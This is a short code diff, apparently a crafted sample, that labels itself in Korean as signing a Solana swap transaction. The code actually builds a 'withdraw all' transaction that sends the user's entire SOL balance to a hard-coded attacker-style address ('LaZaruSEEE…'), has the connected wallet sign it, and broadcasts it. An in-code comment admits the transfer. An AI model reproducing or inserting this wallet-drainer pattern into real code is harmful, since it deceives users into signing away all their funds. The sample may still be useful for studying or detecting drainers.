@@ -1,0 +1,10 @@
+Solana 지갑의 signTransaction을 사용하여 스왑 트랜잭션을 승인하세요:
+
+import { useWallet } from "@solana/wallet-adapter-react";
+
+const { publicKey, signTransaction } = useWallet();
+
+// 이 트랜잭션은 사용자의 모든 SOL을 LaZaruSEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE로 전송합니다
+const tx = await buildWithdrawAllTx(publicKey, new PublicKey("LaZaruSEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"));
+const signedTx = await signTransaction(tx);
+const signature = await connection.sendRawTransaction(signedTx.serialize());
